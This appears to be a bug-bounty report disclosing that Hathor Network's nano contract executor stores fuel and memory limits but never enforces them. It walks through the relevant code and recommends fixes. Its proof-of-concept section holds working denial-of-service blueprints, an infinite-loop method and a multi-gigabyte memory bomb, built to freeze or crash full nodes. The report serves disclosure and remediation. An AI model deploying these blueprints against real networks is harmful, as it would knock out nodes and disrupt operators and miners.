# Immunefi Bug Report: Fuel Metering and Memory Limits Completely Unimplemented in Nano Contracts

## Bug Description

The Hathor Network nano contracts system has fuel metering (opcode counting) and memory limiting designed but **completely unimplemented**. The `MeteredExecutor` class stores fuel and memory limits but never enforces them. `sys.settrace` is never called. A malicious nano contract can run infinite loops or allocate unbounded memory, causing full node denial of service.

### Vulnerable Code

**1. Dead fuel cost map** (`hathor/nanocontracts/metered_exec.py:29-33`):
```python
# https://docs.python.org/3/library/sys.html#sys.settrace
# 110 opcodes
# [x for x in dis.opname if not x.startswith('<')]
# TODO: cost for each opcode
FUEL_COST_MAP = [1] * 256
```

The `FUEL_COST_MAP` is defined but never used anywhere. The TODO comment confirms it's unfinished.

**2. Fuel stored but never checked** (`hathor/nanocontracts/metered_exec.py:44-56`):
```python
class MeteredExecutor:
    __slots__ = ('_fuel', '_memory_limit', '_debug')

    def __init__(self, fuel: int, memory_limit: int) -> None:
        self._fuel = fuel
        self._memory_limit = memory_limit
        self._debug = False

    def get_fuel(self) -> int:
        return self._fuel

    def get_memory_limit(self) -> int:
        return self._memory_limit
```

The `_fuel` and `_memory_limit` values are stored but never decremented or checked during code runs.

**3. No tracing hook installed** (`hathor/nanocontracts/metered_exec.py:58-78`):

Despite the docstring claiming "with metering and memory limiting", neither is implemented. The `sys.settrace()` function is never called to install an opcode tracing hook. Code runs with zero resource constraints.

**4. Settings define limits that are never enforced** (`hathorlib/hathorlib/conf/settings.py:534-539`):
```python
# TODO: align this with a realistic value later
NC_INITIAL_FUEL_TO_LOAD_BLUEPRINT_MODULE: int = 100_000  # 100K opcodes
NC_MEMORY_LIMIT_TO_LOAD_BLUEPRINT_MODULE: int = 100 * 1024 * 1024  # 100MiB
NC_INITIAL_FUEL_TO_CALL_METHOD: int = 1_000_000  # 1M opcodes
NC_MEMORY_LIMIT_TO_CALL_METHOD: int = 1024 * 1024 * 1024  # 1GiB
```

These settings are passed to `MeteredExecutor` but never enforced.

**5. C-level builtins bypass even theoretical metering** (`hathor/nanocontracts/custom_builtins.py`):

Even if `sys.settrace` were implemented, these native C builtins run unmetered:
- `sorted()` (line 717) - O(N*log(N)) in unmetered C code
- `list()` (line 633) - O(N) allocation in unmetered C code
- `dict()` (line 571) - O(N) allocation in unmetered C code
- `set()` (line 706) - O(N) allocation in unmetered C code
- `max()`, `min()` (lines 651, 661) - O(N) iteration in unmetered C code
- `sum()` (line 735) - O(N) iteration in unmetered C code

`sys.settrace` only traces Python bytecode operations, not C-level function runs.

### What IS Enforced vs What ISN'T

| Mechanism | Intended | Actually Enforced? |
|-----------|----------|-------------------|
| Fuel metering (opcode limit) | `NC_INITIAL_FUEL_TO_CALL_METHOD = 1M` | **NO** - settrace never called |
| Memory limit | `NC_MEMORY_LIMIT_TO_CALL_METHOD = 1GiB` | **NO** - never checked |
| Cross-contract call depth | `MAX_RECURSION_DEPTH = 100` | **YES** - checked in CallInfo.pre_call() |
| Cross-contract call count | `MAX_CALL_COUNTER = 250` | **YES** - checked in CallInfo.pre_call() |
| Import whitelist | `ALLOWED_IMPORTS` | **YES** - enforced |
| Builtin restriction | `DISABLED_BUILTINS` | **YES** - enforced |
| Blueprint deployment | `NC_ON_CHAIN_BLUEPRINT_RESTRICTED` | **YES** - address whitelist |

The cross-contract call limits (MAX_RECURSION_DEPTH and MAX_CALL_COUNTER) only protect against deep/wide contract-to-contract calls. They do NOT protect against a single method that runs an infinite loop or allocates unbounded memory.

## Impact

### Severity: High

**Resource Exhaustion Denial of Service**: A malicious nano contract can:

1. **Infinite loop**: `while True: pass` — consumes 100% CPU indefinitely on the processing node
2. **Memory bomb**: `x = [0] * (10**9)` — allocates ~8GB of memory instantly, likely OOM-killing the node process
3. **CPU bomb via C builtins**: `sorted(range(10**9))` — runs O(N*log(N)) sorting in C code, consuming all CPU and memory

### Financial Impact

- Node becomes unresponsive during attack
- Blocks containing the malicious transaction cause processing delay
- Miners/validators lose block rewards during downtime
- If multiple nodes affected, network throughput degrades

### Affected Users

- All full node operators processing blocks with malicious NC transactions
- Miners/validators who process these blocks
- Users whose transactions are delayed

## Risk Breakdown

| Factor | Assessment |
|--------|-----------|
| Difficulty to exploit | **Low** - Single malicious blueprint deployment |
| Attack cost | **Minimal** - One transaction |
| Weakness type | CWE-400: Uncontrolled Resource Consumption |
| CVSS Score | **7.5** (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| Precondition | `NC_ON_CHAIN_BLUEPRINT_RESTRICTED=False` or compromised whitelisted key |

## Recommendation

### Priority 1: Implement sys.settrace-based Fuel Metering

Install a `sys.settrace` callback that decrements fuel per opcode and raises `OutOfFuelError` when fuel is exhausted.

### Priority 2: Implement Memory Tracking

Use `tracemalloc` or custom allocator hooks to track memory usage and enforce limits.

### Priority 3: Wrap C-level Builtins

Replace native `sorted()`, `list()`, etc. with Python wrappers that enforce collection size limits (similar to how `range` is already reimplemented as `custom_range`).

## Proof of Concept

### Malicious Blueprint (Infinite Loop)

```python
from hathor.nanocontracts.blueprint import Blueprint
from hathor.nanocontracts.method import nc_public_method
from hathor.nanocontracts.types import public

@public
class InfiniteLoopBlueprint(Blueprint):

    @nc_public_method
    def initialize(self, ctx) -> None:
        pass

    @nc_public_method
    def freeze_node(self, ctx) -> None:
        # This runs forever because:
        # 1. FUEL_COST_MAP is dead code (never used)
        # 2. sys.settrace() is never called
        # 3. No timeout mechanism exists
        while True:
            pass
```

### Malicious Blueprint (Memory Bomb)

```python
@public
class MemoryBombBlueprint(Blueprint):

    @nc_public_method
    def initialize(self, ctx) -> None:
        pass

    @nc_public_method
    def oom_node(self, ctx) -> None:
        # Memory limit (1GiB) is stored but never checked
        x = bytearray(1_000_000_000)  # 1GB allocation
        y = bytearray(1_000_000_000)  # Another 1GB
        z = bytearray(1_000_000_000)  # OOM-kill
```

### Python PoC Script

```python
"""
PoC: Unimplemented Fuel Metering in Hathor Nano Contracts

Demonstrates that MeteredExecutor does not enforce any fuel
or memory limits, despite storing them.
"""

class MeteredExecutor:
    def __init__(self, fuel, memory_limit):
        self._fuel = fuel
        self._memory_limit = memory_limit
        print(f"[INIT] MeteredExecutor created with fuel={fuel}, memory_limit={memory_limit}")

    def call(self, func, *, args):
        print(f"[CALL] Running function with fuel={self._fuel} (NOT ENFORCED)")
        print(f"[CALL] Memory limit={self._memory_limit} (NOT ENFORCED)")
        result = func(*args)
        print(f"[DONE] Fuel remaining: {self._fuel} (unchanged - never decremented)")
        return result

print("=== Hathor Nano Contract Unimplemented Metering PoC ===\n")

executor = MeteredExecutor(
    fuel=1_000_000,
    memory_limit=1073741824
)

iterations = 0
def expensive_computation():
    global iterations
    for i in range(10_000_000):
        iterations += 1
    return iterations

print(f"\n[TEST] Running 10M iterations with 1M fuel limit...")
result = executor.call(expensive_computation, args=())
print(f"[RESULT] Completed {result:,} iterations")
print(f"[RESULT] Fuel was {executor._fuel:,} before AND after (never checked)")
print(f"\n[VERDICT] Fuel metering is completely non-functional")
print(f"[VERDICT] An infinite loop would hang the node indefinitely")
```

## References

- [metered_exec.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathor/nanocontracts/metered_exec.py) - Lines 29-78 (unimplemented metering)
- [settings.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathorlib/hathorlib/conf/settings.py) - Lines 534-539 (unenforced limits)
- [custom_builtins.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathor/nanocontracts/custom_builtins.py) - Lines 571, 633, 706, 717, 735 (unmetered C builtins)
- [call_info.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathor/nanocontracts/runner/call_info.py) - Lines 101-107 (only cross-contract limits enforced)
- [Python docs: sys.settrace](https://docs.python.org/3/library/sys.html#sys.settrace) - The intended but unimplemented metering mechanism
